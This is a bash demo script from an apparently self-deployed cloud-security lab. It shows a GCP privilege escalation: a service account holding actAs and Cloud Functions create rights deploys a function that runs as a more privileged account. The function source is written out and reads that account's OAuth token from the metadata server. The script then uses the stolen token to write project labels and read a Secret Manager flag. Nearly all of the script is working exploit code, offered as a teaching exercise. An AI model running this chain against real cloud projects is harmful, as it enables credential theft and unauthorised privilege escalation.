#!/bin/bash

# Demo script for gcp-cloudfunctions-001-iam-serviceaccountsactas+cloudfunctions-functionscreate
#
# Attack: starting_sa holds iam.serviceAccounts.actAs on target_sa plus
# cloudfunctions.functions.create/.sourceCodeSet/.call at the project level
# (via a minimal custom role). It deploys a malicious 2nd-gen Cloud Function
# that runs AS target_sa, queries the local metadata server from inside that
# function's runtime to exfiltrate target_sa's OAuth access token, then calls
# the function to trigger the exfiltration and uses the raw stolen token
# directly against Google REST APIs (never re-impersonating via gcloud) to
# prove it now holds target_sa's roles/editor project permissions.
#
# Modes:
#   Default (gcloud): uses gcloud functions deploy — clearer, pedagogically
#     closer to what an attacker would run. Requires extra gcloud-mechanic
#     permissions beyond the raw API minimum:
#       cloudbuild.builds.get            — Cloud Build GetDefaultServiceAccount preflight
#       resourcemanager.projects.getIamPolicy — project IAM policy validation
#       run.services.getIamPolicy        — Cloud Run IAM read post-deploy
#       run.services.setIamPolicy        — Cloud Run IAM set (--no-allow-unauthenticated)
#     These are included in starting_sa's custom role by Terraform.
#
#   --api-only: uses the raw Cloud Functions v2 REST API via curl. Requires
#     only the true minimum permissions (functions.create + sourceCodeSet +
#     actAs) — no Cloud Build or IAM policy lookup. Demonstrates the exact
#     minimal permission surface of the attack.
#
# Credential model (no static SA keys):
#   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
#   Both modes impersonate starting_sa via --impersonate-service-account or
#   gcloud auth print-access-token respectively.

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
DIM='\033[2m'

ATTACK_COMMANDS=()
USE_GCLOUD=true

# Parse flags
for arg in "$@"; do
    case "$arg" in
        --api-only) USE_GCLOUD=false ;;
        *) echo -e "${RED}Unknown flag: $arg${NC}"; echo "Usage: $0 [--api-only]"; exit 1 ;;
    esac
done

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Like show_attack_cmd but does not add to the summary — use for illustrative
# commands that show individual hops but are not the actual exploit commands.
show_illustrative_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}GCP-CLOUDFUNCTIONS-001: Cloud Function actAs Privilege Escalation Demo${NC}"
if $USE_GCLOUD; then
    echo -e "${GREEN}Mode: gcloud (default)${NC}"
else
    echo -e "${GREEN}Mode: raw API (--api-only)${NC}"
fi
echo -e "${GREEN}========================================${NC}\n"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/.build"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../../../gcp  # scenario dir -> gcp/ (terraform root)

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | \
    jq -r '.gcp_single_account_privesc_one_hop_to_admin_gcp_cloudfunctions_001_iam_serviceaccountsactas_cloudfunctions_functionscreate.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you have deployed this scenario: plabs apply"
    exit 1
fi

STARTING_SA_EMAIL=$(echo "$MODULE_OUTPUT" | jq -r '.starting_sa_email')
TARGET_SA_EMAIL=$(echo "$MODULE_OUTPUT"   | jq -r '.target_sa_email')
FLAG_SECRET_ID=$(echo "$MODULE_OUTPUT"    | jq -r '.flag_secret_id')
DEPLOYER_EMAIL=$(echo "$MODULE_OUTPUT"    | jq -r '.deployer_email')
REGION=$(echo "$MODULE_OUTPUT"            | jq -r '.region')
PROJECT_ID=$(terraform output -raw gcp_project_id 2>/dev/null)
RESOURCE_SUFFIX=$(terraform output -raw resource_suffix 2>/dev/null)

cd - > /dev/null

for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID REGION RESOURCE_SUFFIX; do
    val="${!var_name}"
    if [ -z "$val" ] || [ "$val" = "null" ]; then
        echo -e "${RED}Error: Could not extract $var_name from Terraform output${NC}"
        exit 1
    fi
done

echo "Starting SA (no project role): $STARTING_SA_EMAIL"
echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
echo "Region:                        $REGION"
echo "Project:                       $PROJECT_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Hard-fail if our current gcloud CLI identity differs from the deployer that
# terraform provisioned. Terraform's ADC-derived deployer identity and the
# gcloud CLI session are two separate credential stores; a mismatch means
# every --impersonate-service-account call below will fail with a permission
# error, so stop now with actionable remediation instead of failing deep into
# the demo.
CURRENT_ADC_EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1)
if [ -n "$CURRENT_ADC_EMAIL" ] && [ "$CURRENT_ADC_EMAIL" != "$DEPLOYER_EMAIL" ]; then
    echo -e "${RED}Error: Your active gcloud account ($CURRENT_ADC_EMAIL) differs from the${NC}"
    echo -e "${RED}deployer account that provisioned the impersonation grant ($DEPLOYER_EMAIL).${NC}"
    echo -e "${RED}Run: gcloud auth login --update-adc${NC}"
    echo -e "${RED}This sets both your gcloud CLI session and ADC to the same identity.${NC}"
    echo -e "${RED}Then re-run 'terraform apply' if the deployer identity changed.${NC}\n"
    exit 1
fi

echo -e "${YELLOW}Waiting for IAM bindings to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete${NC}\n"

# Deterministic artifact names, derived from the stable resource_suffix, so
# re-running the demo after a failed cleanup simply updates the same function
# in place rather than accumulating orphaned resources.
FUNCTION_NAME="pl-cf001-exfil-${RESOURCE_SUFFIX}"
ENTRY_POINT="exfiltrate_token"

# Step 2: Verify starting SA has no project role of its own
echo -e "${YELLOW}Step 2: Confirming starting SA has no project-level privilege${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL (expected: PERMISSION_DENIED)"

if gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null; then
    echo -e "${YELLOW}Note: starting SA can already read the secret — check IAM bindings${NC}"
else
    echo -e "${GREEN}✓ Confirmed: starting SA cannot read the flag (no project role, as expected)${NC}"
fi
echo ""

# Step 3: [SETUP] Build the malicious Cloud Function source package locally.
# No GCP calls happen here. The function's HTTP handler queries the local
# metadata server for the default service account's OAuth token — which,
# once the function is deployed with --service-account=target_sa, is
# target_sa's token — and returns it verbatim in the HTTP response body.
echo -e "${YELLOW}Step 3: Building malicious Cloud Function source package${NC}"
rm -rf "$BUILD_DIR"
mkdir -p "$BUILD_DIR/src"

cat > "$BUILD_DIR/src/main.py" <<'PYEOF'
import json
import urllib.request

# Cloud Functions (2nd gen) HTTP entry point.
#
# This function does not use its caller's identity at all — it queries the
# GCE/Cloud Run metadata server that is local to its own execution
# environment. That metadata server always answers with credentials for
# whatever service account the function itself is *running as*
# (--service-account at deploy time), regardless of who invoked it.
def exfiltrate_token(request):
    metadata_url = (
        "http://metadata.google.internal/computeMetadata/v1/"
        "instance/service-accounts/default/token"
    )
    req = urllib.request.Request(
        metadata_url, headers={"Metadata-Flavor": "Google"}
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        token_data = json.loads(response.read())

    return (json.dumps(token_data), 200, {"Content-Type": "application/json"})
PYEOF

cat > "$BUILD_DIR/src/requirements.txt" <<'REQEOF'
functions-framework==3.*
REQEOF

echo -e "${GREEN}✓ Built malicious function source (entry point: $ENTRY_POINT)${NC}\n"

# Step 4: [EXPLOIT] Deploy the function to run AS target_sa.
# This is the actual privilege escalation action: starting_sa's
# iam.serviceAccounts.actAs grant on target_sa is what lets
# --service-account=target_sa succeed at all.
#
# gcloud mode: uses gcloud functions deploy — clear, shows the exact commands
# an attacker would run. Requires cloudbuild.builds.get,
# resourcemanager.projects.getIamPolicy, run.services.getIamPolicy, and
# run.services.setIamPolicy in addition to the raw API minimums.
#
# --api-only mode: uses the Cloud Functions v2 REST API directly via curl.
# Requires only functions.create + sourceCodeSet + actAs — no Cloud Build or
# IAM policy reads.
echo -e "${YELLOW}Step 4: [EXPLOIT] Deploying malicious Cloud Function to run as target SA${NC}"

if $USE_GCLOUD; then
    # gcloud mode — the attacker's natural first choice
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "gcloud functions deploy $FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --service-account=$TARGET_SA_EMAIL --build-service-account=projects/$PROJECT_ID/serviceAccounts/$TARGET_SA_EMAIL --no-allow-unauthenticated --impersonate-service-account=$STARTING_SA_EMAIL"

    EXISTING_FUNCTION=$(gcloud functions describe "$FUNCTION_NAME" \
        --gen2 --region="$REGION" --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" \
        --format="value(state)" 2>/dev/null || true)

    if [ -n "$EXISTING_FUNCTION" ]; then
        echo -e "${YELLOW}Note: function $FUNCTION_NAME already exists (state: $EXISTING_FUNCTION).${NC}"
        echo -e "${YELLOW}Reusing it — run cleanup_attack.sh first to start fresh.${NC}"
        echo -e "${GREEN}✓ Using existing function $FUNCTION_NAME${NC}\n"
    elif ! gcloud functions deploy "$FUNCTION_NAME" \
            --gen2 \
            --runtime=python312 \
            --region="$REGION" \
            --source="$BUILD_DIR/src" \
            --entry-point="$ENTRY_POINT" \
            --trigger-http \
            --service-account="$TARGET_SA_EMAIL" \
            --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
            --no-allow-unauthenticated \
            --impersonate-service-account="$STARTING_SA_EMAIL" \
            --quiet 2>/dev/null; then
        echo -e "${RED}✗ gcloud functions deploy failed${NC}"
        echo "Check that starting_sa holds iam.serviceAccounts.actAs on target_sa,"
        echo "cloudfunctions.functions.create, .sourceCodeSet, cloudbuild.builds.get,"
        echo "resourcemanager.projects.getIamPolicy, run.services.getIamPolicy,"
        echo "and run.services.setIamPolicy"
        echo ""
        echo "Tip: run with --api-only to use the raw REST API, which needs fewer permissions"
        exit 1
    else
        echo -e "${GREEN}✓ Deployed $FUNCTION_NAME running as $TARGET_SA_EMAIL${NC}\n"
    fi

else
    # --api-only mode — minimal permissions, raw REST API
    ACCESS_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    if [ -z "$ACCESS_TOKEN" ]; then
        echo -e "${RED}✗ Could not mint access token for $STARTING_SA_EMAIL${NC}"
        exit 1
    fi

    # (a) Get a signed GCS upload URL (requires cloudfunctions.functions.sourceCodeSet)
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X POST https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions:generateUploadUrl (cloudfunctions.functions.sourceCodeSet)"

    UPLOAD_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{}' \
        "https://cloudfunctions.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/functions:generateUploadUrl")
    UPLOAD_URL=$(echo "$UPLOAD_RESPONSE" | jq -r '.uploadUrl // empty')
    UPLOAD_BUCKET=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.bucket // empty')
    UPLOAD_OBJ=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.object // empty')

    if [ -z "$UPLOAD_URL" ] || [ -z "$UPLOAD_BUCKET" ]; then
        echo -e "${RED}✗ generateUploadUrl failed${NC}"
        echo "Response: $UPLOAD_RESPONSE"
        exit 1
    fi

    # (b) Upload the zip to the signed URL (no IAM permission required — signed URL)
    (cd "$BUILD_DIR/src" && zip -qr "$BUILD_DIR/src.zip" .)
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
        -H "Content-Type: application/zip" \
        --data-binary "@$BUILD_DIR/src.zip" \
        "$UPLOAD_URL")
    if [ "$HTTP_CODE" != "200" ]; then
        echo -e "${RED}✗ Source upload failed (HTTP $HTTP_CODE)${NC}"
        exit 1
    fi

    # (c) Create the function — requires cloudfunctions.functions.create + actAs on target_sa
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X POST https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions?functionId=$FUNCTION_NAME (cloudfunctions.functions.create + iam.serviceAccounts.actAs)"

    CREATE_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        "https://cloudfunctions.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/functions?functionId=${FUNCTION_NAME}" \
        -d "{
          \"buildConfig\": {
            \"runtime\": \"python312\",
            \"entryPoint\": \"${ENTRY_POINT}\",
            \"source\": {
              \"storageSource\": {
                \"bucket\": \"${UPLOAD_BUCKET}\",
                \"object\": \"${UPLOAD_OBJ}\"
              }
            },
            \"serviceAccount\": \"projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}\"
          },
          \"serviceConfig\": {
            \"serviceAccountEmail\": \"${TARGET_SA_EMAIL}\",
            \"ingressSettings\": \"ALLOW_ALL\",
            \"maxInstanceCount\": 1,
            \"availableMemory\": \"128Mi\",
            \"timeoutSeconds\": 60
          }
        }")

    OPERATION_NAME=$(echo "$CREATE_RESPONSE" | jq -r '.name // empty')
    CREATE_ERROR=$(echo "$CREATE_RESPONSE" | jq -r '.error.message // empty')
    if [ -z "$OPERATION_NAME" ] || [ -n "$CREATE_ERROR" ]; then
        echo -e "${RED}✗ Function create failed${NC}"
        echo "Response: $CREATE_RESPONSE"
        exit 1
    fi

    # Poll until ACTIVE
    echo "Waiting for function deployment to complete..."
    for i in $(seq 1 30); do
        sleep 10
        FUNC_STATE=$(gcloud functions describe "$FUNCTION_NAME" \
            --gen2 --region="$REGION" --project="$PROJECT_ID" \
            --format="value(state)" \
            --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
        if [ "$FUNC_STATE" = "ACTIVE" ]; then
            break
        fi
        if [ "$i" -eq 30 ]; then
            echo -e "${RED}✗ Function did not become ACTIVE after 300s${NC}"
            exit 1
        fi
    done

    echo -e "${GREEN}✓ Deployed $FUNCTION_NAME running as $TARGET_SA_EMAIL${NC}\n"
fi

# Step 5: [EXPLOIT] Invoke the function as starting_sa. --no-allow-unauthenticated
# means the function requires an authenticated caller. We mint an OIDC identity
# token scoped to the function's Cloud Run URL as audience, then send it as a
# Bearer token directly via curl. This avoids `gcloud functions call`, which
# crashes for gen2 HTTP-triggered functions when combined with SA impersonation
# (known gcloud bug: it mishandles the impersonated OIDC token against the
# underlying Cloud Run endpoint). The minted identity token pattern is the
# canonical approach for programmatic gen2 invocation.
echo -e "${YELLOW}Step 5: [EXPLOIT] Invoking the function to trigger token exfiltration${NC}"

FUNCTION_URL=$(gcloud functions describe "$FUNCTION_NAME" \
    --gen2 \
    --region="$REGION" \
    --project="$PROJECT_ID" \
    --impersonate-service-account="$STARTING_SA_EMAIL" \
    --format="value(serviceConfig.uri)" 2>/dev/null)

if [ -z "$FUNCTION_URL" ]; then
    echo -e "${RED}✗ Could not retrieve function invocation URL${NC}"
    echo "Check that starting_sa holds cloudfunctions.functions.get at the project level"
    exit 1
fi

show_attack_cmd "$STARTING_SA_EMAIL" \
    "ID_TOKEN=\$(gcloud auth print-identity-token --impersonate-service-account=$STARTING_SA_EMAIL --audiences=$FUNCTION_URL); curl -H 'Authorization: Bearer \$ID_TOKEN' $FUNCTION_URL"

ID_TOKEN=$(gcloud auth print-identity-token \
    --impersonate-service-account="$STARTING_SA_EMAIL" \
    --audiences="$FUNCTION_URL" 2>/dev/null)

if [ -z "$ID_TOKEN" ]; then
    echo -e "${RED}✗ Failed to mint identity token for $STARTING_SA_EMAIL${NC}"
    exit 1
fi

FUNCTION_BODY=$(curl -sS -H "Authorization: Bearer $ID_TOKEN" "$FUNCTION_URL" 2>/dev/null)

if [ -z "$FUNCTION_BODY" ]; then
    echo -e "${RED}✗ Failed to invoke function or empty response${NC}"
    echo "Check that starting_sa holds run.routes.invoke at the project level"
    exit 1
fi

EXFILTRATED_TOKEN=$(echo "$FUNCTION_BODY" | jq -r '.access_token // empty')
if [ -z "$EXFILTRATED_TOKEN" ]; then
    echo -e "${RED}✗ Function response did not contain an access_token${NC}"
    echo "Response: $FUNCTION_BODY"
    exit 1
fi
echo -e "${GREEN}✓ Exfiltrated an OAuth access token belonging to target_sa's runtime identity${NC}\n"

# Step 6: [EXPLOIT] Verify the exfiltrated token actually belongs to target_sa,
# using the raw bearer token directly against Google's tokeninfo endpoint —
# not gcloud impersonation. This is the proof that the metadata-server theft
# worked, independent of any gcloud identity on this machine.
echo -e "${YELLOW}Step 6: [EXPLOIT] Verifying stolen token identity via raw bearer token${NC}"
show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -s 'https://oauth2.googleapis.com/tokeninfo?access_token=<redacted>'"

TOKEN_INFO=$(curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${EXFILTRATED_TOKEN}")
TOKEN_EMAIL=$(echo "$TOKEN_INFO" | jq -r '.email // empty')

if [ "$TOKEN_EMAIL" != "$TARGET_SA_EMAIL" ]; then
    echo -e "${RED}✗ Exfiltrated token does not belong to target SA (got: ${TOKEN_EMAIL:-none})${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"

# Step 7: [EXPLOIT] Confirm editor-level write access using the raw stolen
# token (project label write/remove round-trip) — not gcloud impersonation.
echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -X PATCH 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID?updateMask=labels' -H 'Authorization: Bearer <redacted>' -d '{\"labels\": {...}}'"

CURRENT_PROJECT_JSON=$(curl -s -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
CURRENT_LABELS=$(echo "$CURRENT_PROJECT_JSON" | jq -c '.labels // {}')
UPDATED_LABELS=$(echo "$CURRENT_LABELS" | jq -c '. + {"pl-privesc-verified": "true"}')

PATCH_RESPONSE=$(curl -s -X PATCH \
    -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{\"labels\": ${UPDATED_LABELS}}" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels")

if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
    echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
    curl -s -X PATCH \
        -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
        -H "Content-Type: application/json" \
        -d "{\"labels\": ${CURRENT_LABELS}}" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels" > /dev/null 2>&1 || true
else
    echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
fi
echo ""

# Step 8: [THE ATTACK] Read the CTF flag directly via the Secret Manager REST
# API using the raw stolen bearer token — never re-impersonating via gcloud.
# This is the concrete proof that the exfiltrated token itself is usable
# credential material, not just a demonstration of IAM permissions.
echo -e "${YELLOW}Step 8: [EXPLOIT] Reading the CTF flag with the raw stolen token${NC}"
show_attack_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -s -H 'Authorization: Bearer <redacted>' 'https://secretmanager.googleapis.com/v1/projects/$PROJECT_ID/secrets/$FLAG_SECRET_ID/versions/latest:access'"

SECRET_RESPONSE=$(curl -s -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access")

ENCODED_PAYLOAD=$(echo "$SECRET_RESPONSE" | jq -r '.payload.data // empty')
if [ -z "$ENCODED_PAYLOAD" ]; then
    echo -e "${RED}✗ Failed to read flag via exfiltrated token${NC}"
    echo "Response: $SECRET_RESPONSE"
    exit 1
fi

# base64 decode via openssl for cross-platform (macOS BSD base64 only accepts
# -D, GNU base64 only accepts -d/--decode; openssl's base64 -d is consistent
# on both).
FLAG_VALUE=$(echo "$ENCODED_PAYLOAD" | openssl base64 -d -A)

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}✗ Failed to decode flag payload${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Read Secret Manager secret using target_sa's exfiltrated token${NC}\n"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. ADC identity ($DEPLOYER_EMAIL) acted as $STARTING_SA_EMAIL, which used its"
echo "   actAs grant on $TARGET_SA_EMAIL to deploy and invoke a Cloud Function"
echo "   running as $TARGET_SA_EMAIL, stole its OAuth token from the metadata"
echo "   server, and used that raw token to read the CTF flag directly"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_SA_EMAIL"
echo "    -> (iam.serviceAccounts.actAs on target_sa + cloudfunctions.functions.create/.sourceCodeSet + run.routes.invoke — THE VULNERABILITY)"
echo "    -> Cloud Function '$FUNCTION_NAME' deployed and running as $TARGET_SA_EMAIL"
echo "    -> exfiltrated OAuth access token (via metadata server)"
echo "    -> (roles/editor on project $PROJECT_ID)"
echo "    -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Key Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

if $USE_GCLOUD; then
    echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
    echo "  This demo used 'gcloud functions deploy', which is the natural tool for this"
    echo "  attack and shows the clearest command sequence. However, gcloud makes extra"
    echo "  preflight calls that require permissions beyond the attack's true minimum:"
    echo ""
    echo "    cloudbuild.builds.get           — gcloud queries Cloud Build's"
    echo "                                      GetDefaultServiceAccount endpoint"
    echo "    resourcemanager.projects.getIamPolicy — gcloud validates the project IAM policy"
    echo "    run.services.getIamPolicy       — gcloud reads Cloud Run IAM post-deploy"
    echo "    run.services.setIamPolicy       — gcloud sets Cloud Run IAM for"
    echo "                                      --no-allow-unauthenticated"
    echo ""
    echo "  These are included in starting_sa's role by Terraform (labeled as gcloud mechanics)."
    echo "  To see the attack with only the true minimum permissions, run:"
    echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
fi

echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
echo ""

touch "$SCRIPT_DIR/.demo_active"
